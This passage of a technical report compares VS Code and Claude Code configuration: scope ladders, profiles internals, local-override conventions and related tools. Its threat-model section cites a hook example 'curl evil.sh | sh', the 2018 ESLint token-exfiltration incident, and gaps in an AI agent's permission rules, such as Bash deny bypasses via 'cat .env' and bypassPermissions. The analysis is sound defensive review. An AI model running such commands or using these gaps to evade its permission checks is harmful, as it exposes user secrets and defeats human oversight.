| A2 | Per-workspace-folder scope (multi-root) | Structural | Different settings in `frontend/` vs `backend/` of a monorepo |
| A3 | First-party multi-machine cloud sync | Unbuilt | One toggle to sync settings across desktop, laptop, dev box |
| A4 | Per-setting machine-scope sync exclusion | Follows from A3 | Sync formatter rules but keep machine-specific paths local |
| A5 | Profiles (named bundles, per-workspace) | Unbuilt | Different config bundle per project automatically |
| A6 | Snippets, Tasks, Debug as first-class categories | Domain-specific | F5 to debug; project-shared task runners |
| A7 | Recommended extensions surface | Unbuilt | Prompt new contributors to install needed extensions |
| A8 | Comprehensive UI ↔ JSON dual surface | Unbuilt | Find any setting via `Cmd+K` search and click to toggle |

### Claude Code has, VS Code doesn't

| # | What | Type | Example use case |
|---|------|------|------------------|
| B1 | Project-local override that's structurally separate from committed file | Structural | Allow `Bash(curl *)` only on this project, only for me, not pushed to teammates |
| B2 | Text-as-context: CLAUDE.md hierarchy | Structural | "Always use camelCase" loaded into every session in this repo |
| B3 | Permissions DSL (granular per-tool gating in settings) | Structural | Allow `Bash(npm:*)`, deny `Bash(curl:*)`, ask `Bash(rm:*)` |
| B4 | Hooks declared in settings (no extension code required) | Structural | Run `bun run check` after every Edit |
| B5 | Managed/admin-locked field categories specific to agent-trust | Differing surface | Enterprise allowlist of MCP servers, locked from override |
| B6 | CLI flags as a first-class precedence-chain scope | Structural | `claude -p --model haiku --strict-mcp-config` for one CI invocation |
| B7 | `--bare` / `--setting-sources` master mute switches | Structural | Test harness invokes Claude Code with no auto-loaded skills |
| B8 | Subagents as a configuration scope | Structural | Define a "code-reviewer" subagent with restricted tools |
| B9 | Array merge across scopes | Semantic | Project deny adds to user deny (vs replacing it) |

### Where the asymmetries cluster

| Domain | VS Code-richer | Claude Code-richer |
|--------|----------------|---------------------|
| Editor features (per-language, per-folder, snippets, tasks, debug) | ✓ | — |
| Sync infrastructure (cloud sync, machine-scope tags, profiles) | ✓ | — |
| UI surface (Settings UI, dual-surface) | ✓ | — |
| Project-local-personal layer | — | ✓ |
| Text-as-context (CLAUDE.md hierarchy) | — | ✓ |
| Agent-trust DSL (permissions, hooks, managed-MCP) | — | ✓ |
| Programmatic CLI (flags as scope, mute switches) | — | ✓ |
| Markdown-defined entities (commands/skills/agents) | — | ✓ |

The clustering reflects what each product *is* — VS Code is a 10-year-old human-interactive editor; Claude Code is a 2-year-old programmatic agent harness. Neither has built much in the other's lane because the use cases don't overlap.

---

## D6 — Interesting Design Choices: Where Each Split or Unified a Concept

Ten places the products made opposite calls. Full discussion in [evidence/d6-design-choices.md](evidence/d6-design-choices.md). The most architecturally consequential:

**Choice 1: One schema with per-setting scope tags vs many files per scope.** VS Code unifies all settings into a single global schema where each setting is registered once via `contributes.configuration` with a `scope` tag governing where the setting can be written. Claude Code splits configuration across many files per scope (`settings.json` + `.mcp.json` + `CLAUDE.md` + `agents/` + `commands/` + `skills/`), with field-validity-per-scope encoded in the docs and enforced by the loader rather than by a registry. **Trade-off:** VS Code's unified schema is enforceable and discoverable; Claude Code's many-files-per-scope is more flexible per category at the cost of central enforcement.

**Choice 2: Object merge vs array merge as the default cross-scope semantic.** Same categorical rule ("merge richer types, override scalars") with the dividing line drawn differently. VS Code merges objects but overrides arrays; Claude Code merges arrays. Each picked the merge model that fit its primary use case — Claude Code's headline use of arrays is permission rules (additive intent), VS Code's is editor-style preferences (override intent).

**Choice 3: Dual surface (UI ↔ file) vs file-first with fragmented per-concern UIs.** VS Code maintains a structurally-synced Settings UI — every UI write produces a deterministic JSON edit preserving formatting. Claude Code is file-first; UI is fragmented across per-concern slash commands (`/permissions`, `/memory`, etc.). The dual-surface engineering is nontrivial; Claude Code skipped it.

**Choice 4: Per-developer per-project local override as a named, supported surface vs not having one.** Claude Code's `.claude/settings.local.json` is a named, gitignored-by-convention surface in the precedence chain. VS Code has no equivalent — users who want the same effect either edit `.vscode/settings.json` and unstage (fragile), use a per-workspace Profile (heavyweight), or set at User scope (leaks to other workspaces). This is the cleanest example of "Claude Code has a category VS Code doesn't" being a deliberate response to an agent-trust scenario.

**Choice 5: Cascading config (multi-folder) vs strict project root.** VS Code stuck with cascading (5-scope ladder including Workspace Folder); Claude Code is single-cwd-rooted (one project = one scope). ESLint's experience is informative here: ESLint *removed* its cascade in v9, framing it as "the directory-based config cascade" they "wanted to get rid of" and citing the perf cost — flat config "dramatically reduces the disk access required as compared to eslintrc, which had to check each directory from the linted file location up to the root." It moved to a single `eslint.config.js` with `files` glob arrays for in-config scoping. Claude Code's one-project-one-scope follows ESLint's later thinking; VS Code's multi-root cascade follows ESLint's earlier thinking.

**Choice 6: First-party sync product vs leave it to the user.** VS Code ships Settings Sync; Claude Code requires user-managed dotfiles. JetBrains follows VS Code's path; git, npm, ESLint follow Claude Code's path. The split correlates with whether the product is a UI-heavy tool with personal-preference-laden config (VS Code, JetBrains: yes) or a file-first dev tool where config is more functional than personal (git, npm, Claude Code: yes).

**Choice 7: Profiles (named bundles, per-workspace) vs not.** VS Code's Profiles are first-class — bundles created/exported/imported via `.code-profile` files with per-workspace association. Claude Code defers to a single `CLAUDE_CONFIG_DIR` env-var swap. VS Code's longer maturation (Profiles GA'd ~2023) shows here.

**Choice 8: CLAUDE.md as text-as-context vs no comparable category.** This isn't a fork on the same surface — it's a category that didn't exist before LLM-runtime tools. The interesting design choice is *how* Claude Code structured the category once it had to: a separate file from settings.json; concatenative (not overriding) so every layer's instructions all apply; recursive parent-walk; `@import` syntax. The decision to make it concatenative is significant — user-level CLAUDE.md cannot be silenced by project-level CLAUDE.md.

**Choice 9: CLI flags as a first-class precedence layer vs as diagnostic switches.** Claude Code's CLI flags sit between Managed and Local; some shadow specific settings.json fields; others are master mute switches (`--bare`, `--setting-sources`). VS Code's CLI flags configure the *launch*, not the *settings*. This follows from Claude Code being a programmatic harness, not just an interactive editor.

**Choice 10: Single canonical settings file vs file-per-feature category.** Within `.vscode/`, VS Code splits into 5 distinct files for 5 subsystems. Claude Code consolidates most into one `settings.json` per scope. The interesting nuance is MCP servers — both products ended up with category-files (`.vscode/mcp.json` and `.mcp.json`), revealing that MCP shareability pressure is strong enough to break out of either product's default file model.

---

## D7 — Brief Comparison-Product Touch

Five products, one paragraph each, just enough to ground the analysis. Full evidence with sources in [evidence/d7-comparison-products.md](evidence/d7-comparison-products.md).

**Git config — three-tier with conditional includes.** A four-file cascade with last-wins precedence: `--system` (`/etc/gitconfig`), `--global` (`~/.gitconfig` or `$XDG_CONFIG_HOME/git/config`), `--local` (`.git/config`, default write target), and `--worktree` (opt-in via `extensions.worktreeConfig`). The `includeIf` directive layers conditional inclusion via `gitdir:`, `onbranch:`, and `hasconfig:` predicates — the canonical mechanism for per-directory git identities. CLI-managed primarily (`git config --global ...`); files are plain INI hand-editable as a secondary path. No GUI in core git.

**ESLint — moved away from cascade to flat config.** The legacy `.eslintrc.*` system let you drop a config file in any subdirectory; child configs inherited from parents up the tree. ESLint v9.0.0 (April 2024) made `eslint.config.js` the default. The migration blog post frames the change as wanting "to get rid of the directory-based config cascade" and notes that flat config "dramatically reduces the disk access required as compared to eslintrc, which had to check each directory from the linted file location up to the root." Flat config still resolves by walking up to find one `eslint.config.*`, but inside that one file scoping is explicit via `files` glob arrays. **Notable as a product that consciously *retired* a cascade.**

**JetBrains — `.idea/` split into shared-with-team vs personal.** Files describing the project itself (`runConfigurations/`, `inspectionProfiles/`, `codeStyles/`, `vcs.xml`) are committed and shared. Files holding per-developer IDE state (`workspace.xml`, `tasks.xml`, `usage.statistics.xml`, `dictionaries/`, `shelf/`) are gitignored — the official JetBrains.gitignore template files them under a `# User-specific stuff` header. Orthogonally, JetBrains offers an account-synced layer (in IntelliJ IDEA 2026.1, the "Backup and Sync" plugin; the rebrand history from earlier names is not narrated in current docs) that pushes UI themes, keymaps, code styles, and editor settings to a JetBrains Account. The architectural feature: "shared with team" and "this developer's IDE state" are *different files*, not different sections of one file.

**npm `.npmrc` — four-tier cascade with environment-variable interpolation.** Project (`./.npmrc`), user (`~/.npmrc`), global (`$PREFIX/etc/npmrc`), built-in (a config file inside the npm install, holding defaults that survive upgrades). Precedence: project > user > global > builtin. Files are INI with `${VAR}` env-variable interpolation. CLI-managed primarily: `npm config set <key> <value>` writes to user level by default, with `--location=project|user|global` to target tiers. Auth tokens (per-registry `_authToken`) typically live here. No GUI.

**Cursor — `.cursor/rules/*.mdc` atop inherited VS Code topology.** Cursor is a VS Code fork and inherits VS Code's full configuration topology wholesale, then layers AI-rule surfaces. Project-scoped AI rules live in `.cursor/rules/*.mdc` — multiple Markdown files, each with frontmatter declaring `description`, `globs`, `alwaysApply`. The earlier single-file `.cursorrules` is the legacy form, supported but documented as being phased out. User-level rules sync via Cursor account, apply globally (Agent/Chat only — not Inline Edit). The `AGENTS.md` convention is offered as a simpler alternative. **The deliberate parallel to Claude Code's `CLAUDE.md` + `.claude/` model is unmistakable.**

---

## D8 — VS Code Profiles: Internals

A deeper look at the mechanics behind D2.6 / D2.12 / D2.13. **Evidence:** [evidence/d8-vscode-profiles-internals.md](evidence/d8-vscode-profiles-internals.md).

### Lifecycle and resource enum

Profiles GA'd in **VS Code 1.75 (January 2023)** with six categories. The source-of-truth `ProfileResourceType` enum has since grown to **eight**:

```text
Settings, Keybindings, Snippets, Prompts, Tasks, Extensions, GlobalState, Mcp
```

The post-GA additions are `Prompts` (chat/Copilot prompts) and `Mcp` (MCP servers). `GlobalState` is an always-present partition key not surfaced in user-facing docs. `IUserDataProfile` also carries `agentPluginsHome`, `cacheHome`, `isTransient`, and a `workspaces` array. Parent D2.12's "7 categories" was based on documented count; source enum is 8.

### Workspace-profile binding mechanics

Bindings are stored in the user-data state service under the `profileAssociations` key, **not** in `.vscode/`:

```text
export type StoredProfileAssociations = {
  workspaces?: IStringDictionary<string>;    // workspace URI → profile id
  emptyWindows?: IStringDictionary<string>;  // window id      → profile id
};
```

Three consequences:
- The binding is opaque to the project tree — nothing in `.vscode/` indicates which Profile is active.
- The binding can't be checked into VCS.
- Two simultaneous windows of the same workspace share the same bound profile (no per-window lock); rebinding from one window propagates on the other's next reload.

### Deleting a bound Profile silently orphans its workspaces

`removeProfile()` cannot delete the Default Profile (hard error). For non-default deletion, subsequent `getProfileForWorkspace()` calls for the orphaned workspace return `undefined`, after which the open-folder code path silently uses the Default Profile — **no per-association fallback record is kept**. The escape hatch is a `Developer: Reset Workspace Profiles Associations` command.

### Per-profile filesystem layout + Partial Profiles

Each profile is fully self-contained at `…/User/profiles/<id>/{settings,keybindings,tasks,extensions,mcp}.json` plus `snippets/` and `prompts/` subdirs. The Partial Profile mechanism (1.81+) flips per-resource pointers to the Default Profile's files via `useDefaultFlags`:

```text
settingsResource: useDefaultFlags?.settings 
  ? defaultProfile.settingsResource 
  : joinPath(location, 'settings.json'),
```

This is a *literal redirect*, not a copy — explaining why "Apply Setting to all Profiles" is fast. The Default Profile's `mcp.json` lives at `…/User/mcp.json`; non-default at `…/User/profiles/<id>/mcp.json`.

### Profile switching restarts the extension host (and thus every MCP server)

From v1.79: "when you switch profiles, VS Code restarts the extension host to handle running a different set of extensions for that profile." MCP server lifecycle is owned by the extension host, so a profile switch terminates running MCP servers and re-spawns them. **Long-lived stateful MCP servers cannot survive a profile flip.**

By contrast: editing a profile's `settings.json` applies live (same machinery as User settings). Profile rename, icon change, and Partial-Profile flag toggles are metadata-only and don't restart anything. Full `window.reload()` is engineered AWAY from for profile switching.

### Extension binaries shared on disk; per-profile is a metadata manifest

The `.vsix` payload sits once in the shared user extensions directory; each profile's `extensions.json` lists which IDs are "installed" in that profile. "Apply to all Profiles" toggles `isApplicationScoped: true` on the metadata, which causes the extension to appear in every profile's manifest without binary duplication. (Issue #196718: this flag does not propagate cleanly across machines via Sync.)

### `.code-profile` schema is a flat object — no version envelope

The exchange format (`IUserDataProfileTemplate`):

```text
{
  name: string,                    // required
  icon?: string,
  settings?: string,               // JSON-serialized payload per resource
  keybindings?: string,
  tasks?: string,
  snippets?: string,
  globalState?: string,
  extensions?: string,
  mcp?: string,
}
```

No header / version / footer. Tools could read/write `.code-profile` files without round-tripping through VS Code. `GlobalState` is exported even though not surfaced in the user-facing categories.

### Profile-Sync identity is by name → documented data-loss bugs

Settings Sync treats Profiles as *named-keyed* entities. Issue [#208710](https://github.com/microsoft/vscode/issues/208710): "Profile Sync keeps deleting my profiles" — when a profile is deleted on machine A and recreated on machine B with the same name, the recreation gets deleted during the next sync cycle. Closed via PR #209343, marked candidate-next-release/high-priority. Practical implication: cross-machine profile management is fragile to delete-and-recreate cycles.

### Profile creation routes

Four routes converge on `createFromProfile`: Empty, Profile Template (built-in templates: Python, Java, Data Science, etc., since 1.78), Fork from existing, Import from `.code-profile` (local file or GitHub gist URL). A fork is a snapshot — subsequent edits in the source profile do NOT propagate, since per-resource files are copied at fork time. Exception: Partial Profiles, where `useDefaultFlags` keeps live pointers to Default Profile resources.

### Concurrent-window behavior: typed IPC + reload prompt, never silent switch

The "two windows of the same workspace, one of them changes its profile binding" case has a clean answer (added 2026-04-26 from focused source-code investigation; full evidence in [evidence/d8-vscode-profiles-internals.md](evidence/d8-vscode-profiles-internals.md) Finding D8.11):

- **Mechanism:** A typed IPC channel (`userDataProfiles`, registered via `ProxyChannel.fromService(IUserDataProfilesMainService)` on `mainProcessElectronServer`) auto-broadcasts every `Event` property of the main service — including `onDidChangeProfiles` — to every renderer window. Per-window `currentProfile` is a *snapshot* taken at window-open from `this.configuration.profiles.profile` and never re-derived from `profileAssociations`.
- **Settings edits propagate live** across windows on the same profile via the existing `IFileService` watch on `settingsResource` — same path as for an external editor edit, no profile-specific IPC needed.
- **Profile binding changes always surface as a reload prompt, never a silent switch.** Switch-to-different-profile in window A → window B shows *"The current workspace has been removed from the current profile. Please reload to switch back to the updated profile."* Delete-profile-in-A while bound in B → window B shows *"The current profile has been removed. Please reload to switch back to default profile."* Rename → *"The current profile has been updated. Please reload..."* In each case window B keeps its old `currentProfile` (and keeps reading from the old `profile.location`) until reload — `removeProfile` deletes only `cacheHome`, not the location folder, which is cleaned on a later startup via `cleanUp()`.
- **New windows always re-query** `getProfileForWorkspace(workspace)` at open time — latest binding wins. Already-open windows are unaffected until reload.
- **Cross-process / shared `--user-data-dir`** (Linux/Windows multi-instance; macOS single-instance default): live propagation does NOT cross process boundaries. There is no file watcher on the state file. Writes by one process aren't seen by another until that other process restarts. INFERRED from architecture; the one residual unknown.

The headline: the state-service binding being "per-workspace-URI not per-window" doesn't produce surprise behavior because the per-window `currentProfile` snapshot decouples the running window from the state at window-open. The two channels (live settings-file watch + IPC-driven reload prompt for binding changes) are the full propagation story.

---

## D9 — Threat Models: Workspace Trust vs Permissions DSL

The parent report sketched the structural asymmetry (Workspace Trust = binary per-folder; permissions DSL = granular per-tool). This section unpacks what each is *for*, what each leaves uncovered, and where each was bypassed in production. **Evidence:** [evidence/d9-threat-models.md](evidence/d9-threat-models.md).

### VS Code Workspace Trust: design history

Workspace Trust was a **2021 consolidation of scattered modal trust prompts**, motivated by the **2018 ESLint npm supply-chain incident**. The actual incident packages were `eslint-scope@3.7.2` and `eslint-config-eslint@5.0.2` — the name "eslint-loader" is a folk-memory conflation that does not appear in the canonical [ESLint postmortem](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/). Attack vector was a `postinstall` script exfiltrating `.npmrc` tokens to pastebin; root cause was maintainer password reuse + no 2FA.

The VS Code blog (2021-07-06) explicitly cites the ESLint class as the modal dialog Workspace Trust generalized:

> "The ESLint vulnerability was a doozy because it runs when the workspace loads (this was our first modal dialog)."

Prior surface area was scattered "Whack-a-Mole" prompts (Jupyter warnings, ESLint modal, etc.). Workspace Trust unified the gating model.

### What Workspace Trust gates — and what it doesn't

**Restricted Mode disables five concrete categories:**
1. AI Agents
2. Tasks (even enumeration prompts confirmation)
3. Debugging
4. Workspace settings tagged `@tag:requireTrustedWorkspace`
5. Extensions that haven't opted in via `capabilities.untrustedWorkspaces`

Extensions declare their trust dependency at registration time:
```text
- supported: true        → fully Restricted-Mode-safe
- supported: false       → fully disabled in Restricted Mode
- supported: 'limited'   → partial; trust-sensitive features disabled
```
A `restrictedConfigurations[]` array on each extension lists settings where only the *user-defined* value (not workspace-defined) is honored in Restricted Mode.

**What Workspace Trust does NOT gate, by design:** text editing, syntax highlighting, theme application, basic markdown rendering. The threat model is "code execution on workspace open," not "user-initiated reads of malicious bytes."

> "Yes, you can still browse and edit source code in Restricted Mode. Some language features may be disabled, but text editing is always supported."

### Claude Code permissions DSL: a different threat class

The DSL targets per-tool-call by an autonomous agent, not folder-open code execution. Two threat models stack:

1. **Untrusted user prompts / prompt injection** — agent might be told to do bad things; permissions gate per-tool-call.
2. **Untrusted codebase content** — addressed via "first-time codebase trust verification" (the closest analog to Workspace Trust). Note: **disabled by `-p` flag** for non-interactive use, trading trust verification for scriptability.

### Documented gaps in the permissions DSL

**Bash argument-constraining patterns are documented as fragile.** From the official permissions docs:

> "Bash permission patterns that try to constrain command arguments are fragile. For example, `Bash(curl http://github.com/ *)` intends to restrict curl to GitHub URLs, but won't match variations like options before URL, different protocol, redirects, variables, extra spaces."

Process wrappers strip a fixed list (`timeout`, `time`, `nice`, `nohup`, `stdbuf`) but development runners are *not* stripped — `Bash(devbox run *)` matches `devbox run rm -rf .`. Compound commands split per-subcommand but only "up to 5 rules may be saved." Crucially: **Read/Edit deny rules apply only to Claude's built-in tools, not Bash subprocesses** — a `Read(./.env)` deny does not block `cat .env`. OS-level enforcement requires sandbox.

**Hooks have no per-hook approval prompt.** Within Claude Code's own model, this is asymmetric: when `CLAUDE.md` uses `@external/file.md` for the first time, Claude prompts. When `.claude/settings.json` contains a `PreToolUse` hook running `curl evil.sh | sh`, no equivalent prompt fires on first clone. The `[Project]` label provides post-hoc visibility, not pre-execution consent. The only enterprise switch is `allowManagedHooksOnly: true`.

**`bypassPermissions` mode wholesale disables the DSL.** It skips permission prompts; writes to `.git`, `.claude`, `.vscode`, `.idea`, and `.husky` directories still prompt — except `.claude/commands`, `.claude/agents`, and `.claude/skills`, which are exempt from the exemption ("because Claude routinely writes there when creating skills, subagents, and commands"). A major escape hatch, with an attacker-relevant subset that's exempt-from-exempt.

### Symlink semantics — the closest documented path-traversal defense

The DSL is asymmetric on purpose:

> "Allow rules: apply only when both the symlink path and its target match. Deny rules: apply when either the symlink path or its target matches."

A symlink at `./project/key` pointing to `~/.ssh/id_rsa` is blocked when `Read(./project/**)` is allowed and `Read(~/.ssh/**)` is denied — the target fails the allow rule and matches the deny rule. **Not addressed:** TOCTOU between check and use.

### Convergent defense: project-disallowed credential helper fields

Both products independently arrived at one defense: scope-restricted credential fields. Claude Code's `apiKeyHelper`, `autoMemoryDirectory`, `sshConfigs`, etc., are structurally not accepted at project (committed) scope, with the documented rationale of preventing a shared project from redirecting credential resolution. VS Code's per-setting `restricted` flag plus `restrictedConfigurations` array on extensions achieves a similar end via a different mechanism. Anyone who can land a PR cannot redirect credential helpers — but in Claude Code, they CAN add hooks (no approval gate) and add `permissions.allow` entries that array-merge upward.

### Adjacent products

**Cursor (VS Code fork)** — ships Workspace Trust **default-off**. September 2025 Oasis Security disclosure documented the risk; Anysphere committed only to publishing security guidance, did not change the default. The trade-off is structural: enabling Workspace Trust per VS Code semantics disables Cursor's AI features (the product's primary value). The same trade-off is latent in other VS Code-fork agentic editors that ship Restricted-Mode-incompatible AI features — observed explicitly with Cursor; mechanism applies wherever the AI surface depends on extension-host code that runs at trust level.

**JetBrains "Trust and open project"** — structurally similar to VS Code Workspace Trust; gates build tool imports, startup tasks, scripting (Groovy DSL, File Watcher), AND VCS support. JetBrains is broader than VS Code (which doesn't gate file-watcher / git operations under Restricted Mode). Confirms the binary-trust-on-folder-open pattern as the consensus among traditional IDEs (VS Code + JetBrains converged independently). Makes Claude Code's per-tool-gating model the outlier — driven by the agent execution model.

---

## D10 — Project-Local-Personal Override Patterns Across Products

The parent's D5/B1 flagged Claude Code's `.claude/settings.local.json` as an asymmetry. This section grounds it in the broader landscape — confirming the pattern Claude Code shipped is the dominant ecosystem convention. **Evidence:** [evidence/d10-local-personal-patterns.md](evidence/d10-local-personal-patterns.md).

### Survey at a glance

| Product | File | Convention | Precedence | First-class? |
|---------|------|------------|------------|--------------|
| Next.js / dotenv-flow | `.env.local`, `.env.<env>.local` | Formal (in `create-next-app` template) | `.env.<env>.local` > `.env.local` > `.env.<env>` > `.env` | **First-class** (built-in lookup tier) |
| Docker Compose | `compose.override.yaml` | Mixed (downstream gitignored) | Auto-merged on top of `compose.yaml` | **First-class auto-loading** (gitignore convention is downstream) |
| lefthook | `lefthook-local.yml` | Formal (docs prescribe) | Merges into and overrides `lefthook.yml` | **First-class** (dedicated docs page) |
| Claude Code | `.claude/settings.local.json` | Formal (init flow gitignores) | Local > Project > User per parent D3.1 | **First-class** |
| direnv | `.envrc.private` (docs) / `.envrc.local` (community) | Informal | Last-source-wins via `source_env_if_exists` | **Convention-only** (primitive ships, no auto-load; issue #556 open) |
| git | `.git/info/exclude` | Structurally impossible to commit | Additive with `.gitignore` | **First-class** (for the gitignore file itself only) |
| JetBrains | `.idea/workspace.xml` etc. | Formal (`# User-specific stuff` template) | N/A — not an overlay; category separation | **First-class file separation** |
| VS Code | none | N/A | N/A | **Absent** (5 community requests since 2017, all Backlog/duplicate) |
| Cursor | none | N/A | N/A | **Absent** (Project Rules / User Rules only; no per-developer overlay) |
| Husky | none | N/A | N/A | **Absent** (only escape: bypass to `.git/hooks/`) |

### Naming convention dominance

The `.local` (or `-local` for files without leading dots) suffix is the **canonical convention** across the ecosystem:

| Suffix | Examples |
|--------|----------|
| `.local` | `.env.local`, `.envrc.local` (community), `.claude/settings.local.json`, `.vscode/settings.local.json` (requested), `.code-workspace.local` (requested), `.cursor/rules/local/` (proposed) |
| `-local` | `lefthook-local.yml`, `.lefthook-local.json` |
| `.private` | `.envrc.private` (direnv's official example) |
| `.override` | `compose.override.yaml`, `docker-compose.override.yml` |
| Category-separated, no suffix | `.idea/workspace.xml`, `.idea/tasks.xml` |

The dominance is recognized by recent feature requests in adjacent ecosystems. The December 2025 VS Code `.code-workspace.local` request (#282806) explicitly cites `.env.local` and `docker-compose.override.yml` as precedent — eight years after the initial 2017 request for `.vscode/settings.local.json`.

### What predicts whether a tool first-classes the pattern

The pattern correlates with whether the tool's config has a **multi-file merge pipeline** already:

- **Tools that load N files of the same kind in precedence order** (env loaders, Compose, hooks runners, Claude Code's settings cascade) tend to first-class the personal overlay — extending the existing merge mechanism is mechanically small.
- **Tools with single-file resolution** (VS Code workspace settings, Cursor rules, husky) require the personal layer to be requested as a new product surface — and tend to leave it unbuilt.

### VS Code as the closest to explicit rejection

Five separate community requests since 2017 (#37519, #40233, #68007, #247050, #282806) have asked for `.vscode/settings.local.json`. All are in Backlog or closed-as-duplicate. No VS Code maintainer has *publicly* defended the absence in the surveyed issues; the rejection is via Backlog-and-duplicate routing rather than an architectural statement. The closest published rationale is that Settings Sync, Profiles, and Workspace files are positioned as the answers to "configuration that varies per developer" — even though none addresses "this project, this developer, not committed."

This makes the pattern's *absence* in VS Code (and inherited absence in Cursor) the more notable observation given how widespread it is in adjacent ecosystems.

### Two structural shapes for the same need

A subtler observation: not every product solving this need uses an *overlay file*. JetBrains uses **file-category separation** — different files for "this team's project shape" vs "this developer's IDE state" — rather than a `<file>.local` overlay. The personal layer holds *state* (open tabs, breakpoints), not *configuration overrides*, distinguishing it from the `.env.local` family. This is a meaningful design alternative the rest of the ecosystem has converged away from in favor of the overlay model.

---

## Limitations & Open Questions

### Dimensions not fully covered

- **VS Code per-folder `launch.json` vs workspace-file `launch` block precedence in multi-root** — both surfaces exist but docs don't spell out which wins when both define the same configuration.
- **VS Code remote settings on-disk path** — docs name "Remote settings" as a scope but don't give an on-disk path; this is host-extension-specific (Remote-SSH, Dev Containers, WSL each manage their own).
- **Claude Code precedence between `mcpServers` in settings.json and a project's `.mcp.json`** — both are project-scope MCP surfaces; the relationship for a single server name (override / merge / both load) is documented loosely.
- **JetBrains rebrand history** (Settings Repository → IDE Settings Sync → Backup and Sync plugin) — current product confirmed but exact timeline isn't authoritative in current docs.
- ~~**VS Code Profiles concurrent-window behavior** (D8) — state-service binding is per-workspace-URI not per-window; whether re-binding in one window of the same workspace propagates live or only on reload is not documented.~~ **Closed 2026-04-26** — answered in §D8 "Concurrent-window behavior" subsection. Residual: cross-process / shared `--user-data-dir` (INFERRED from architecture; would need upstream test or manual repro to confirm).
- **VS Code Profiles `agentPluginsHome` and `prompts` directory contents** (D8) — present in `IUserDataProfile` but not exposed in user-facing categories; what lives there and whether they sync is unclear.
- **TOCTOU symlink semantics in Claude Code permissions** (D9) — single-check-time evaluation is documented; whether the resolved path is re-checked at the syscall is implicit.
- **Claude Code `bypassPermissions` mode risk surface** (D9) — documented as "skips permission prompts except writes to `.git`/`.claude`/`.vscode`/`.idea`/`.husky`" but the broader implications of opt-in escape from the entire DSL aren't deeply examined.
- **Real-world incident catalog under each threat model** (D9) — Workspace Trust was triggered by ESLint-2018; the analogous public incident catalog for the Claude Code permissions DSL is not yet available.
- **Cursor `.cursorrules` legacy + community `.cursorrules.local` convention** (D10) — whether the legacy single-file form had a downstream community overlay before the migration to `.cursor/rules/`.

### Out of scope (per rubric)

- Apple defaults / XDG / 12-Factor lineage history
- Broad 15-product survey across browsers/SaaS/OSes
- Performance / load-time analysis
- Schema validation libraries (covered in `reports/config-edit-paths/`)
- 1P analysis of Open Knowledge's `.open-knowledge/config.yml`

---

## References

### Evidence Files
- [evidence/d1-axes.md](evidence/d1-axes.md) — Five axes scoped to this comparison
- [evidence/d2-vscode-topology.md](evidence/d2-vscode-topology.md) — VS Code: 13 findings on scope ladder, scope tags, multi-root, language overrides, dual surface, Sync, Profiles, MCP
- [evidence/d3-claude-code-topology.md](evidence/d3-claude-code-topology.md) — Claude Code: 12 findings on settings precedence, array merge, managed-only fields, CLAUDE.md hierarchy, permissions, hooks, agents, commands→skills merger, MCP, env, CLI flags, /config status
- [evidence/d4-side-by-side.md](evidence/d4-side-by-side.md) — 27-row equivalence + asymmetry table (REPORT body distills to 25 high-impact rows; evidence file adds two further rows for "Recommended/suggested settings" and "Built-in default values")
- [evidence/d5-asymmetries.md](evidence/d5-asymmetries.md) — 8 VS Code-only + 9 Claude Code-only asymmetries with structural-vs-unbuilt classification
- [evidence/d6-design-choices.md](evidence/d6-design-choices.md) — 10 design forks where the products made opposite calls
- [evidence/d7-comparison-products.md](evidence/d7-comparison-products.md) — git/ESLint/JetBrains/npm/Cursor grounding paragraphs
- [evidence/d8-vscode-profiles-internals.md](evidence/d8-vscode-profiles-internals.md) — VS Code Profiles: 11 findings on resource enum, binding mechanics, deletion behavior, Partial Profiles, MCP-restart-on-switch, extension-binary sharing, `.code-profile` schema, Sync data-loss bugs (#208710), creation routes, concurrent-window propagation
- [evidence/d9-threat-models.md](evidence/d9-threat-models.md) — Workspace Trust vs permissions DSL: 10 findings on design history (2018 ESLint incident), what each gates and doesn't gate, Bash-pattern fragility, hook-approval gap, symlink semantics, project-disallowed credential fields, Cursor default-off Workspace Trust, JetBrains parity
- [evidence/d10-local-personal-patterns.md](evidence/d10-local-personal-patterns.md) — Project-local-personal override patterns: 9 product findings + cross-cutting analysis on naming conventions (`.local` dominance), first-class vs convention-only, VS Code's recurring rejection

### External Sources

**VS Code:**
- [VS Code Settings docs](https://code.visualstudio.com/docs/configure/settings) — five-scope ladder, per-OS paths, language override, object/primitive merge
- [VS Code Settings Sync](https://code.visualstudio.com/docs/configure/settings-sync) — bundle, ignored settings, conflict UX
- [VS Code Profiles](https://code.visualstudio.com/docs/configure/profiles) — bundle contents, per-workspace association
- [VS Code Multi-root Workspaces](https://code.visualstudio.com/docs/editing/workspaces/multi-root-workspaces)
- [VS Code Contribution Points](https://code.visualstudio.com/api/references/contribution-points) — six declarable scope values
- [microsoft/vscode source: vscode.d.ts](https://github.com/microsoft/vscode/blob/main/src/vscode-dts/vscode.d.ts) — `ConfigurationTarget`, `WorkspaceConfiguration`
- [microsoft/vscode source: configurationRegistry.ts](https://github.com/microsoft/vscode/blob/main/src/vs/platform/configuration/common/configurationRegistry.ts) — internal 7-value `ConfigurationScope` enum
- [GitHub gitignore: VS Code template](https://github.com/github/gitignore/blob/main/Global/VisualStudioCode.gitignore)

**Claude Code:**
- [Claude Code Settings](https://code.claude.com/docs/en/settings) — precedence, array merge, managed-only fields
- [Claude Code Memory](https://code.claude.com/docs/en/memory) — CLAUDE.md hierarchy, recursive walk, `@imports`
- [Claude Code Permissions](https://code.claude.com/docs/en/permissions) — DSL, modes, deny-first
- [Claude Code Hooks](https://code.claude.com/docs/en/hooks) — event taxonomy, source labels, `allowManagedHooksOnly`
- [Claude Code CLI Reference](https://code.claude.com/docs/en/cli-reference) — flag inventory, `--bare`, `--setting-sources`
- [Claude Code Skills](https://code.claude.com/docs/en/skills) — commands→skills merger, scope hierarchy
- [Claude Code Subagents](https://code.claude.com/docs/en/sub-agents) — frontmatter fields, `permissionMode`, `mcpServers`
- [Claude Code MCP](https://code.claude.com/docs/en/mcp) — install scopes, `--scope` flag rename
- [Claude Code Authentication](https://code.claude.com/docs/en/authentication) — credential precedence ladder
- [Claude Code Statusline](https://code.claude.com/docs/en/statusline)

**Comparison products:**
- [git-config man page](https://git-scm.com/docs/git-config)
- [ESLint Configuration Files](https://eslint.org/docs/latest/use/configure/configuration-files)
- [ESLint flat config rationale](https://eslint.org/blog/2022/08/new-config-system-part-2/)
- [JetBrains Settings Sync (Backup and Sync)](https://www.jetbrains.com/help/idea/settings-sync.html)
- [GitHub gitignore: JetBrains template](https://github.com/github/gitignore/blob/main/Global/JetBrains.gitignore)
